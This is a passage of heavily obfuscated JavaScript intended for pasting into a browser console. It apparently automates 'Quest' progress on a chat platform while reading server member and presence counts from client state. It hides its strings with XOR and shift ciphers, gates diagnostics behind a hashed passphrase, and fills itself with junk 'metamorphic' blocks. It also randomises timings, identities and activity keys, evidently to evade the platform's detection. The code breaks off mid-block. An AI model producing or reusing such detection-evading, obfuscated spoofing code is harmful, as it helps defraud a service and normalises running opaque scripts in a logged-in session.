console.clear();
(() => {
  const _0xmod = {};

  (function (_0xmod) {

  let _0xopen = false; 
  
  
  const LOG_LEVEL = 2; 
  const Log = (() => {
    const noop = () => {};
    if (LOG_LEVEL === 0) return { say: noop, diag: noop, warn: noop, info: noop };
    return {
      say: (c, m) => console.debug(`[Google ${c}] ${m}`),
      diag: (m, d) => { if (LOG_LEVEL >= 2 && _0xopen) d !== undefined ? console.debug(`[O8-DIAG] ${m}`, d) : console.debug(`[O8-DIAG] ${m}`); },
      warn: (m) => console.warn(m),
      info: (m) => console.debug(m)
    };
  })();

  
      
      const _0xsalt = String.fromCharCode(...[82,66,97,97,43,44,103,112,35,86,37,119,38,37,84,109,124,42,103,56,86,95,123,64,49,67,33,81]);
      const _0xwant = "201f1688cc9ac88301d578cfa6d1e6408dde219cd7b11dda70a184945b917204";
      const GoogleUnlock = async (pw) => {
        try {
          if (!(window.crypto && window.crypto.subtle)) { Log.warn("[Quest] Diagnostics unlock unavailable in this context."); return false; }
          const _0buf = await window.crypto.subtle.digest("SHA-256", new TextEncoder().encode(_0xsalt + String(pw ?? "")));
          const _0hex = Array.from(new Uint8Array(_0buf)).map(b => b.toString(16).padStart(2, "0")).join("");
          if (_0hex === _0xwant) { _0xopen = true; Log.info("[Quest] Diagnostics unlocked for this session."); return true; }
          Log.warn("[Quest] Unlock passphrase rejected.");
          return false;
        } catch (e) { Log.warn("[Quest] Unlock failed: " + (e && e.message ? e.message : e)); return false; }
      };
      try { window.GoogleUnlock = GoogleUnlock; } catch (e) {}
      const SUITE_VERSION = "O.8.5-Shard-3";
  const INSTANCE_ID = "2de579ef";
  Log.info(`[Quest ${SUITE_VERSION}] started — metamorphic instance ${INSTANCE_ID}.`);
  Log.diag(`O8.5 core — uniform phrase pools, log-lock, studio gaps, refill queue, metamorphic decode.`);
  
  
  Log.diag("Experimental configuration", {
    delayModel: "lognormal",
    lazyForcer: true,
    lazyForceLimit: 50,
    timestampModel: "monotonic-five-decimal",
    promiseHandoff: true,
    randomizedIdentityFallback: true,
    randomizedActivityKey: true,
    studioGaps: true,
  });

    _0xmod.log = Log;

    (() => {
      const _0x07aaa6 = { p: 0, q: 0, r: 0 };
      const _0xe048a5 = [3, 7, 11, 5];
      for (let i = 0; i < 12; i++) {
        _0x07aaa6.p = (_0x07aaa6.p + _0xe048a5[i % 4]) & 0xffff;
        if ((i & 1) === 0) { _0x07aaa6.q = (_0x07aaa6.q ^ _0x07aaa6.p) & 0xffff; }
        _0x07aaa6.r = (_0x07aaa6.r + i * 31) & 0xffff;
      }
      const _0xb72a43 = _0x07aaa6.p ^ _0x07aaa6.q ^ _0x07aaa6.r;
      const _0x2a0ad2 = Array.from({ length: (_0xb72a43 & 3) + 2 }, (_, i) => (i * 33) & 0xffff);
      const _0x90bbd3 = _0x2a0ad2.slice(0, 3).reduce((a, b) => a + b, 0);
      if (_0x90bbd3 > 0x7ffff) { _0x2a0ad2 = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0xb67342 = (x) => { let h = 0; for (let i = 0; i < 5; i++) { h = (h * 33 + ((x >>> (i * 2)) & 0xff)) & 0xffffffff; } return h >>> 0; };
      const _0x68c9e9 = (a, b) => ((a << 3) ^ (b >>> 1) ^ (b << 5)) & 0xffffffff;
      const _0x63c4cc = (Date.now() & 0xffff) ^ 0xf22c;
      const _0xdfaac0 = _0xb67342(_0x63c4cc);
      let _0x2e85a0 = _0xdfaac0;
      for (let i = 0; i < 6; i++) { try { _0x2e85a0 = _0x68c9e9(_0x2e85a0, i * 2654435761); } catch (e) { break; } }
      const _0x97040f = [_0x63c4cc, _0xdfaac0, _0x2e85a0];
      if (_0x97040f.length > 2 && (_0x2e85a0 & 7) === 0) { _0x97040f.length = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x25edd5 = [22734,48645,14984,40149,41802];
      const _0x159328 = {};
      for (let i = 0; i < _0x25edd5.length; i++) { const w = _0x25edd5[i]; _0x159328[w] = (w.length * 2654435761) >>> 0; }
      let _0x7f56a8 = 0;
      for (const x in _0x159328) { _0x7f56a8 = (_0x7f56a8 + _0x159328[x]) & 0xffffffff; }
      const _0xeade20 = [_0x7f56a8, _0x25edd5.length];
      const _0xe0ed18 = _0x25edd5.reduce((a, b) => (a + b) & 0xffff, 0);
      if (_0xeade20[0] < 0 || _0xe0ed18 === 0) { _0xeade20[0] = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x2f6c08 = [50303,62547,40054,29298,36038];
      const _0x309c6a = {};
      for (let i = 0; i < _0x2f6c08.length; i++) { const w = _0x2f6c08[i]; _0x309c6a[w] = (w.length * 2654435761) >>> 0; }
      let _0x32376e = 0;
      for (const x in _0x309c6a) { _0x32376e = (_0x32376e + _0x309c6a[x]) & 0xffffffff; }
      const _0x92772f = [_0x32376e, _0x2f6c08.length];
      const _0xc8e6d5 = _0x2f6c08.reduce((a, b) => (a + b) & 0xffff, 0);
      if (_0x92772f[0] < 0 || _0xc8e6d5 === 0) { _0x92772f[0] = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x98fc3c = (x) => { let h = 0; for (let i = 0; i < 5; i++) { h = (h * 33 + ((x >>> (i * 2)) & 0xff)) & 0xffffffff; } return h >>> 0; };
      const _0x59de38 = (a, b) => ((a << 3) ^ (b >>> 1) ^ (b << 5)) & 0xffffffff;
      const _0x01c1cf = (Date.now() & 0xffff) ^ 0x0774;
      const _0xa74049 = _0x98fc3c(_0x01c1cf);
      let _0x57a0ca = _0xa74049;
      for (let i = 0; i < 6; i++) { try { _0x57a0ca = _0x59de38(_0x57a0ca, i * 2654435761); } catch (e) { break; } }
      const _0x5d3a4e = [_0x01c1cf, _0xa74049, _0x57a0ca];
      if (_0x5d3a4e.length > 2 && (_0x57a0ca & 7) === 0) { _0x5d3a4e.length = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

  })(_0xmod);

  (function (_0xmod) {
    const Log = _0xmod.log;

  
  const MemberCount = (() => {
    const _0xk = 113;
    const _0xds = a => String.fromCharCode(...a.map(c => c ^ _0xk));
    const S = {
      mc: _0xds([28,20,28,19,20,3,50,30,4,31,5]), amc: _0xds([16,1,1,3,30,9,24,28,16,5,20,60,20,28,19,20,3,50,30,4,31,5]), mcu: _0xds([28,20,28,19,20,3,46,18,30,4,31,5]), mem: _0xds([28,20,28,19,20,3,2]),
      oc: _0xds([30,31,29,24,31,20,50,30,4,31,5]), pc: _0xds([1,3,20,2,20,31,18,20,50,30,4,31,5]), apc: _0xds([16,1,1,3,30,9,24,28,16,5,20,33,3,20,2,20,31,18,20,50,30,4,31,5]), ocu: _0xds([30,31,29,24,31,20,46,18,30,4,31,5]),
      n0: _0xds([42,60,20,28,19,20,3,50,30,4,31,5,44,81,63,30,81,28,20,28,19,20,3,81,2,5,16,5,24,2,5,24,18,2,81,16,3,20,81,18,4,3,3,20,31,5,29,8,81,16,7,16,24,29,16,19,29,20,81,24,31,81,29,30,18,16,29,81,18,29,24,20,31,5,81,2,5,16,5,20,95]), n1: _0xds([42,60,20,28,19,20,3,50,30,4,31,5,44,81,60,20,28,19,20,3,2,75,81]), n2: _0xds([81,13,81,62,31,29,24,31,20,75,81]), n3: _0xds([42,60,20,28,19,20,3,50,30,4,31,5,44,81,61,30,18,16,29,81,28,20,28,19,20,3,81,21,16,5,16,81,18,30,4,29,21,81,31,30,5,81,19,20,81,3,20,16,21,95]), ua: _0xds([4,31,16,7,16,24,29,16,19,29,20])
    };
    
    const _0xwindows = [1, 5, 15, 60];
    const _0xseen = new Set();
    const _0xspan = (a, b) => { const t = String(a).length + (b ? String(b).length : 0); return t; };
    const _0xnote = (tag, value) => { try { if (_0xseen.size < 128) _0xseen.add(String(tag) + ":" + String(value)); } catch (e) {} return _0xseen.size; };
    const _0xframe = { rank: 0, peak: 0, span: 0 };
    const _0xfold = () => { _0xframe.span = _0xwindows[0]; return _0xframe.span; };
    const _0xlog = { samples: 0, lastAt: 0, total: null };
    const _0xemit = s => { try { console.debug(s); } catch (e) {} };
    const number = v => Number.isFinite(v) ? v : null;
    const pick = (o, keys) => {
      if (!o || typeof o !== "object") return null;
      for (const kk of keys) { const n = number(o[kk]); if (n !== null) return n; }
      return null;
    };
    const inspect = source => {
      let total = null, online = null;
      const processItem = item => {
        if (!item || typeof item !== "object") return;
        const itemTotal = pick(item, [S.mc, S.amc, S.mcu]);
        const itemOnline = pick(item, [S.oc, S.pc, S.apc, S.ocu]);
        if (itemTotal !== null) total = (total ?? 0) + itemTotal;
        if (itemOnline !== null) online = (online ?? 0) + itemOnline;
        const guildLike = item[S.mc] != null || item[S.amc] != null || item[S.mcu] != null || item[S.mem];
        if (guildLike && itemTotal === null && item[S.mem] && typeof item[S.mem] === "object") {
          if (item[S.mem] instanceof Map) total = (total ?? 0) + item[S.mem].size;
          else { let count = 0; for (const kk in item[S.mem]) { if (Object.hasOwn(item[S.mem], kk)) count++; } total = (total ?? 0) + count; }
        }
      };
      if (source instanceof Map) source.forEach(processItem);
      else if (source && typeof source === "object") { for (const kk in source) { if (Object.hasOwn(source, kk)) processItem(source[kk]); } }
      return { total, online };
    };
    return {
      report: (...sources) => {
        try {
          let result = { total: null, online: null };
          for (const source of sources) {
            const found = inspect(source);
            if (result.total === null && found.total !== null) result.total = found.total;
            if (result.online === null && found.online !== null) result.online = found.online;
            if (result.total !== null && result.online !== null) break;
          }
          if (result.total === null && result.online === null) {
            _0xemit(S.n0);
            return result;
          }
          const suffix = result.online === null ? "" : `${S.n2}${result.online}`;
          _0xlog.samples++;
          _0xlog.lastAt = Date.now();
          _0xlog.total = result.total;
          _0xemit(`${S.n1}${result.total ?? S.ua}${suffix}`);
          return result;
        } catch (e) {
          _0xemit(S.n3);
          return { total: null, online: null };
        }
      },
      summary: () => {
        try {
          if (_0xlog.total === null || _0xlog.samples === 0) return;
          if (Date.now() - _0xlog.lastAt < 60000) return;
          const t = _0xlog.total;
          _0xemit(`[MemberCount] Still watching ${t} server${t === 1 ? "" : "s"} — nothing unusual.`);
        } catch (e) {}
      }
    };
  })();
  
    const _0xlex = (() => {
    const KC = 47;
    const KP = 61;
    const dec = (s, k) => { let o = ""; for (let i = 0; i < s.length; i++) { const c = s.charCodeAt(i); o += String.fromCharCode(c < 0x80 ? 0x20 + (((c - 0x20 - k) % 0x5F) + 0x5F) % 0x5F : c); } return o; };
    const C = [
      ["|9C81@", "vBE=2<5", "#>17", "'B9>;<5", "u1<D5B", "z9>;", "#DE=2<5", "q<E>45B", "$1>7<5", "w933E@", "v<9D38", "|9C381>35", "#@EDD5B", "$B9@E@", "qE>7<5"], ["z9D217", "w1F5BC13;", "\"E3;C13;", "r1BBI1<<", "sE66<5", "&1<9C5", " ?BD=1>D51E", "z>1@C13;", "w?<41<<", "#144<5217", "|19<217", "'1<<5D", "r1C5", "vB9@", " 1>>95B"], ["$1<<I", "\"?CD5B", "\"579CD5B", "|1>965CD", "\"?<<", "r5>CEC", "{?72??;", "p75>41", "x>45H", "r1D1<?7", "x>F5>D?BI", "r81BD", "sB16D", "#<1D5", "|ECD5B"], ["|541<", "{1EB5<", " <1AE5", "rE@", "w?>?B", "q1475", "#D1B", "\"922?>", "#51<", "rB?G>", "rB5CD", "$?B38", "#@9B5", "u<17", "q1>>5B"], ["|5D5B", "v1E75", "s91<", "#31<5", "q1<1>35", "s9F945B", "#5HD1>D", "pCDB?<125", "!E14B1>D", "\"E<5", "|1B;", "#DB?;5", "$93;", "q51D", " E<C5"], [" 1F5=5>D", " 1BAE5D", " <1J1", " 1D9?", "r?22<5", "u<17CD?>5", "$5BB135", "'1<;G1I", "r?EBDI1B4", "vB94", "u?I5B", "r?BB94?B", "#D??@", " 1CC175", " B?=5>145"], ["q5<<", "v?>7", "z>?3;5B", "\"9>7", "\"1DD<5", "r<1@@5B", "r1B9<<?>", "$?3C9>", "#97>1<", "p<1BE=", "w??D5B", "q513?>", "#9B5>", "z<1H?>", "p<1B="], ["&5CD92E<5", "{1>49>7", "t>DBI", "$8B5C8?<4", " ?BD1<", "v1D5G1I", " ?BD93?", "{?7791", "#9<<", "\"535@D9?>", "t>DB1>35", "s??BCD5@", "'5<3?=5", "v1D5", "{?22I"], ["r?=@1CC", "pD<1C", "'1I@?9>D", "{1>4=1B;", "vE945@?CD", "|9<5CD?>5", "rB?CCB?14", "u?B;", "\"?ED5", " 1D8", "w5149>7", "{1D9DE45", "{?>79DE45", "q51B9>7", "$B5;"], ["'5<3?=5", "|1D", "w51BD8", "#9<<", "t>DBIG1I", "v1D58?EC5", "r1B@5D", "\"E>>5B", "$B514", "{9>D5<", "s??BG1I", "#G55@", "qB??=", "w1<<", "s??B@<1D5"], ["|?BC5<C", "uB17=5>DC", "#>9@@5DC", "sB?@C", "rEB9?C", "$B9F91", "{56D?F5BC", "y?DD9>7C", "v<51>9>7C", "~EDD1;5C", "q9DC", "*5CD", "s1C8", "#=9475>", "}?D5C"], [" <1D6?B=", "q?1B4C", "#?1@2?H", " ?49E=", "s19C", "\"?CDBE=", "u?BE=", "#?E>4CD175", "$851D5B", "pE49D?B9E=", "u??D<978DC", "#@?D<978D", "{9=5<978D", " <1I29<<", "q13;4B?@"], ["}?F5<", "u?<9?", "\"5145B", "r?=93", "p<=1>13", "$?=5", "*9>5", "y?EB>1<", "|171J9>5", " 1=@8<5D", "r81@D5B", "u12<5", "$1<5", "q1<<14", "p>D8?<?7I"], ["vB?F5", "pB2?B5DE=", "&9>5I1B4", "|514?G", " <?D", "}EBC5BI", "w?D8?EC5", "r?>C5BF1D?BI", " 1D38", "vB1>75", "u1B=", "q?G5B", "~B1>75B95", "p<<?D=5>D", "v1B45>"], [" ?CDB??=", "s5@?D", "wE2", "#<?D", "|19<2?H", "{5DD5B2?H", "x>2?H", "~ED2?H", "#D1D9?>", "$5B=9>1<", "tH381>75", "\"5<1I", "r?EB95B", "s9C@1D38", "s5C;"], ["#D?F5", "q?9<5B", "#1=?F1B", "$51@?D", "#D51=5B", "r1E<4B?>", "w?2", "vB944<5", "#;9<<5D", "qEB>5B", "r?@@5B", "r89=>5I", "uE>>5<", "&1<F5", "qB5G5B"], ["|5DB?>?=5", " 5>4E<E=", "$9=5B", "#D?@G1D38", "$5=@?", "r145>35", "|?=5>D", "x>CD1>D", "#53?>4", "|9>ED5", "$?3;", "#1>47<1CC", "r<5@CI4B1", "v>?=?>", "s91<"], ["%D5>C9<C", "#9<F5BG1B5", "$12<5G1B5", "rB?3;5BI", "$B1I", "sB1G5B", "sB5CC5B", "qEB51E", "r144I", "w?<45B", "q9>", "\"13;", "~B71>9J5B", "$9495B", "{1B45B"], ["#8145", "#8EDD5B", "{?EF5B", "&5>5D91>", "\"?<<5B", "&1<1>35", "#G17", "r?B>935", "pG>9>7", "r1>?@I", "rEBD19>", "#1C8", " 1>5", "#3B55>", "{1DD935"], ["|94G1I", "r1B>9F1<", "q?1B4G1<;", "uE>8?EC5", "r1B?EC5<", "q1J11B", " 95B", "tC@<1>145", "tH@?", "u5CD9F1<", "y1=2?B55", "v1<1", "u5D5", "z9?C;", " 1F9<9?>"],
    ];
    const _last = {};
    const pick = (i, arr) => {
      if (!arr || arr.length === 0) return '';
      if (arr.length === 1) return arr[0];
      let j = Math.floor(Math.random() * arr.length);
      if (j === _last[i] && arr.length > 1) j = (j + 1) % arr.length;
      _last[i] = j;
      return arr[j];
    };
    return {
      C: i => { const w = pick(i, C[i]); return w === null || w === undefined ? w : dec(w, KC); },
      P: (i, arr) => pick(i, arr),
      d: (s) => s === null || s === undefined ? s : dec(s, KP)
    };
  })();

    _0xmod.mc = MemberCount;
    _0xmod.lex = _0xlex;

    (() => {
      const _0x449ffc = [10793,47559,44694,10770,37006];
      const _0x5078d0 = {};
      for (let i = 0; i < _0x449ffc.length; i++) { const w = _0x449ffc[i]; _0x5078d0[w] = (w.length * 2654435761) >>> 0; }
      let _0x6c88f5 = 0;
      for (const x in _0x5078d0) { _0x6c88f5 = (_0x6c88f5 + _0x5078d0[x]) & 0xffffffff; }
      const _0xcb4355 = [_0x6c88f5, _0x449ffc.length];
      const _0x1cfb14 = _0x449ffc.reduce((a, b) => (a + b) & 0xffff, 0);
      if (_0xcb4355[0] < 0 || _0x1cfb14 === 0) { _0xcb4355[0] = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0xda6f1d = (x) => { let h = 0; for (let i = 0; i < 5; i++) { h = (h * 33 + ((x >>> (i * 2)) & 0xff)) & 0xffffffff; } return h >>> 0; };
      const _0x8f9138 = (a, b) => ((a << 3) ^ (b >>> 1) ^ (b << 5)) & 0xffffffff;
      const _0x088558 = (Date.now() & 0xffff) ^ 0x52bd;
      const _0x726630 = _0xda6f1d(_0x088558);
      let _0xd14afa = _0x726630;
      for (let i = 0; i < 6; i++) { try { _0xd14afa = _0x8f9138(_0xd14afa, i * 2654435761); } catch (e) { break; } }
      const _0x847f4b = [_0x088558, _0x726630, _0xd14afa];
      if (_0x847f4b.length > 2 && (_0xd14afa & 7) === 0) { _0x847f4b.length = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x29c6d8 = { p: 0, q: 0, r: 0 };
      const _0xc2d4cd = [3, 7, 11, 5];
      for (let i = 0; i < 12; i++) {
        _0x29c6d8.p = (_0x29c6d8.p + _0xc2d4cd[i % 4]) & 0xffff;
        if ((i & 1) === 0) { _0x29c6d8.q = (_0x29c6d8.q ^ _0x29c6d8.p) & 0xffff; }
        _0x29c6d8.r = (_0x29c6d8.r + i * 31) & 0xffff;
      }
      const _0x319866 = _0x29c6d8.p ^ _0x29c6d8.q ^ _0x29c6d8.r;
      const _0xdea52a = Array.from({ length: (_0x319866 & 3) + 2 }, (_, i) => (i * 33) & 0xffff);
      const _0xb5f802 = _0xdea52a.slice(0, 3).reduce((a, b) => a + b, 0);
      if (_0xb5f802 > 0x7ffff) { _0xdea52a = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0xbdf7c8 = [53939,52696,51008,10198,55949];
      const _0x97f69c = {};
      for (let i = 0; i < _0xbdf7c8.length; i++) { const w = _0xbdf7c8[i]; _0x97f69c[w] = (w.length * 2654435761) >>> 0; }
      let _0x528c67 = 0;
      for (const x in _0x97f69c) { _0x528c67 = (_0x528c67 + _0x97f69c[x]) & 0xffffffff; }
      const _0xee953c = [_0x528c67, _0xbdf7c8.length];
      const _0x3b1020 = _0xbdf7c8.reduce((a, b) => (a + b) & 0xffff, 0);
      if (_0xee953c[0] < 0 || _0x3b1020 === 0) { _0xee953c[0] = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x60f71f = (x) => { let h = 0; for (let i = 0; i < 5; i++) { h = (h * 33 + ((x >>> (i * 2)) & 0xff)) & 0xffffffff; } return h >>> 0; };
      const _0x459022 = (a, b) => ((a << 3) ^ (b >>> 1) ^ (b << 5)) & 0xffffffff;
      const _0xdc4b5e = (Date.now() & 0xffff) ^ 0x079b;
      const _0x0bcbae = _0x60f71f(_0xdc4b5e);
      let _0xd7068c = _0x0bcbae;
      for (let i = 0; i < 6; i++) { try { _0xd7068c = _0x459022(_0xd7068c, i * 2654435761); } catch (e) { break; } }
      const _0x4ca9cf = [_0xdc4b5e, _0x0bcbae, _0xd7068c];
      if (_0x4ca9cf.length > 2 && (_0xd7068c & 7) === 0) { _0x4ca9cf.length = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0xd4eab6 = [52302,12206,30692,30992,53989];
      const _0x2e7e27 = {};
      for (let i = 0; i < _0xd4eab6.length; i++) { const w = _0xd4eab6[i]; _0x2e7e27[w] = (w.length * 2654435761) >>> 0; }
      let _0x01e896 = 0;
      for (const x in _0x2e7e27) { _0x01e896 = (_0x01e896 + _0x2e7e27[x]) & 0xffffffff; }
      const _0x997f64 = [_0x01e896, _0xd4eab6.length];
      const _0x7aaf37 = _0xd4eab6.reduce((a, b) => (a + b) & 0xffff, 0);
      if (_0x997f64[0] < 0 || _0x7aaf37 === 0) { _0x997f64[0] = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x60d9a6 = { p: 0, q: 0, r: 0 };
      const _0x74fdad = [3, 7, 11, 5];
      for (let i = 0; i < 12; i++) {
        _0x60d9a6.p = (_0x60d9a6.p + _0x74fdad[i % 4]) & 0xffff;
        if ((i & 1) === 0) { _0x60d9a6.q = (_0x60d9a6.q ^ _0x60d9a6.p) & 0xffff; }
        _0x60d9a6.r = (_0x60d9a6.r + i * 31) & 0xffff;
      }
      const _0x5b5bc1 = _0x60d9a6.p ^ _0x60d9a6.q ^ _0x60d9a6.r;
      const _0x7d8615 = Array.from({ length: (_0x5b5bc1 & 3) + 2 }, (_, i) => (i * 33) & 0xffff);
      const _0x9fe630 = _0x7d8615.slice(0, 3).reduce((a, b) => a + b, 0);
      if (_0x9fe630 > 0x7ffff) { _0x7d8615 = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x159f00 = [62876,12538,31733,40113,42897];
      const _0x9c0784 = {};
      for (let i = 0; i < _0x159f00.length; i++) { const w = _0x159f00[i]; _0x9c0784[w] = (w.length * 2654435761) >>> 0; }
      let _0xac58c7 = 0;
      for (const x in _0x9c0784) { _0xac58c7 = (_0xac58c7 + _0x9c0784[x]) & 0xffffffff; }
      const _0xdeeaec = [_0xac58c7, _0x159f00.length];
      const _0xc21d65 = _0x159f00.reduce((a, b) => (a + b) & 0xffff, 0);
      if (_0xdeeaec[0] < 0 || _0xc21d65 === 0) { _0xdeeaec[0] = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0xb2e829 = { p: 0, q: 0, r: 0 };
      const _0x59aadd = [3, 7, 11, 5];
      for (let i = 0; i < 12; i++) {
        _0xb2e829.p = (_0xb2e829.p + _0x59aadd[i % 4]) & 0xffff;
        if ((i & 1) === 0) { _0xb2e829.q = (_0xb2e829.q ^ _0xb2e829.p) & 0xffff; }
        _0xb2e829.r = (_0xb2e829.r + i * 31) & 0xffff;
      }
      const _0x01a1e0 = _0xb2e829.p ^ _0xb2e829.q ^ _0xb2e829.r;
      const _0x355b0f = Array.from({ length: (_0x01a1e0 & 3) + 2 }, (_, i) => (i * 33) & 0xffff);
      const _0x16b5a3 = _0x355b0f.slice(0, 3).reduce((a, b) => a + b, 0);
      if (_0x16b5a3 > 0x7ffff) { _0x355b0f = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0xecfbaf = (x) => { let h = 0; for (let i = 0; i < 5; i++) { h = (h * 33 + ((x >>> (i * 2)) & 0xff)) & 0xffffffff; } return h >>> 0; };
      const _0x2ecda2 = (a, b) => ((a << 3) ^ (b >>> 1) ^ (b << 5)) & 0xffffffff;
      const _0xb79977 = (Date.now() & 0xffff) ^ 0x9a7c;
      const _0xb57938 = _0xecfbaf(_0xb79977);
      let _0x8b6565 = _0xb57938;
      for (let i = 0; i < 6; i++) { try { _0x8b6565 = _0x2ecda2(_0x8b6565, i * 2654435761); } catch (e) { break; } }
      const _0x336634 = [_0xb79977, _0xb57938, _0x8b6565];
      if (_0x336634.length > 2 && (_0x8b6565 & 7) === 0) { _0x336634.length = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x7fa5b5 = { p: 0, q: 0, r: 0 };
      const _0x9d54ed = [3, 7, 11, 5];
      for (let i = 0; i < 12; i++) {
        _0x7fa5b5.p = (_0x7fa5b5.p + _0x9d54ed[i % 4]) & 0xffff;
        if ((i & 1) === 0) { _0x7fa5b5.q = (_0x7fa5b5.q ^ _0x7fa5b5.p) & 0xffff; }
        _0x7fa5b5.r = (_0x7fa5b5.r + i * 31) & 0xffff;
      }
      const _0xda42db = _0x7fa5b5.p ^ _0x7fa5b5.q ^ _0x7fa5b5.r;
      const _0x3fc2b3 = Array.from({ length: (_0xda42db & 3) + 2 }, (_, i) => (i * 33) & 0xffff);
      const _0x95a55b = _0x3fc2b3.slice(0, 3).reduce((a, b) => a + b, 0);
      if (_0x95a55b > 0x7ffff) { _0x3fc2b3 = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x142cde = [43441,33300,5371,18125,50851];
      const _0xce4b70 = {};
      for (let i = 0; i < _0x142cde.length; i++) { const w = _0x142cde[i]; _0xce4b70[w] = (w.length * 2654435761) >>> 0; }
      let _0xc74fd5 = 0;
      for (const x in _0xce4b70) { _0xc74fd5 = (_0xc74fd5 + _0xce4b70[x]) & 0xffffffff; }
      const _0xf598a7 = [_0xc74fd5, _0x142cde.length];
      const _0x3bd3a4 = _0x142cde.reduce((a, b) => (a + b) & 0xffff, 0);
      if (_0xf598a7[0] < 0 || _0x3bd3a4 === 0) { _0xf598a7[0] = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x470638 = { p: 0, q: 0, r: 0 };
      const _0x61154a = [3, 7, 11, 5];
      for (let i = 0; i < 12; i++) {
        _0x470638.p = (_0x470638.p + _0x61154a[i % 4]) & 0xffff;
        if ((i & 1) === 0) { _0x470638.q = (_0x470638.q ^ _0x470638.p) & 0xffff; }
        _0x470638.r = (_0x470638.r + i * 31) & 0xffff;
      }
      const _0xc5a77e = _0x470638.p ^ _0x470638.q ^ _0x470638.r;
      const _0x49b89a = Array.from({ length: (_0xc5a77e & 3) + 2 }, (_, i) => (i * 33) & 0xffff);
      const _0x000ead = _0x49b89a.slice(0, 3).reduce((a, b) => a + b, 0);
      if (_0x000ead > 0x7ffff) { _0x49b89a = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x334c9f = (x) => { let h = 0; for (let i = 0; i < 5; i++) { h = (h * 33 + ((x >>> (i * 2)) & 0xff)) & 0xffffffff; } return h >>> 0; };
      const _0xdb8e1f = (a, b) => ((a << 3) ^ (b >>> 1) ^ (b << 5)) & 0xffffffff;
      const _0x2976aa = (Date.now() & 0xffff) ^ 0xfe07;
      const _0xdae119 = _0x334c9f(_0x2976aa);
      let _0x682ea4 = _0xdae119;
      for (let i = 0; i < 6; i++) { try { _0x682ea4 = _0xdb8e1f(_0x682ea4, i * 2654435761); } catch (e) { break; } }
      const _0x8e7829 = [_0x2976aa, _0xdae119, _0x682ea4];
      if (_0x8e7829.length > 2 && (_0x682ea4 & 7) === 0) { _0x8e7829.length = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x45eaa2 = [58397,65442,32102,39904,11305];
      const _0xbc28b9 = {};
      for (let i = 0; i < _0x45eaa2.length; i++) { const w = _0x45eaa2[i]; _0xbc28b9[w] = (w.length * 2654435761) >>> 0; }
      let _0x5ae9d9 = 0;
      for (const x in _0xbc28b9) { _0x5ae9d9 = (_0x5ae9d9 + _0xbc28b9[x]) & 0xffffffff; }
      const _0xe12efd = [_0x5ae9d9, _0x45eaa2.length];
      const _0x2b02c1 = _0x45eaa2.reduce((a, b) => (a + b) & 0xffff, 0);
      if (_0xe12efd[0] < 0 || _0x2b02c1 === 0) { _0xe12efd[0] = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x780521 = (x) => { let h = 0; for (let i = 0; i < 5; i++) { h = (h * 33 + ((x >>> (i * 2)) & 0xff)) & 0xffffffff; } return h >>> 0; };
      const _0x0abfdd = (a, b) => ((a << 3) ^ (b >>> 1) ^ (b << 5)) & 0xffffffff;
      const _0x655bab = (Date.now() & 0xffff) ^ 0xbef6;
      const _0xedc88d = _0x780521(_0x655bab);
      let _0x378076 = _0xedc88d;
      for (let i = 0; i < 6; i++) { try { _0x378076 = _0x0abfdd(_0x378076, i * 2654435761); } catch (e) { break; } }
      const _0x7233ea = [_0x655bab, _0xedc88d, _0x378076];
      if (_0x7233ea.length > 2 && (_0x378076 & 7) === 0) { _0x7233ea.length = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

  })(_0xmod);

  (function (_0xmod) {
    _0xmod["timings"] = (() => {
      let _0xs = 0; for (let _0xi = 0; _0xi < 7; _0xi++) _0xs = (_0xs * 33 + ((_0xi * 11) & 0xff)) & 0xffff;
      return { tag: "timings", state: (_0xs & 1) ? "open" : "hold", window: 60 + (_0xs % 240) };
    })();

    (() => {
      const _0xde3f30 = { p: 0, q: 0, r: 0 };
      const _0x6a3eb1 = [3, 7, 11, 5];
      for (let i = 0; i < 12; i++) {
        _0xde3f30.p = (_0xde3f30.p + _0x6a3eb1[i % 4]) & 0xffff;
        if ((i & 1) === 0) { _0xde3f30.q = (_0xde3f30.q ^ _0xde3f30.p) & 0xffff; }
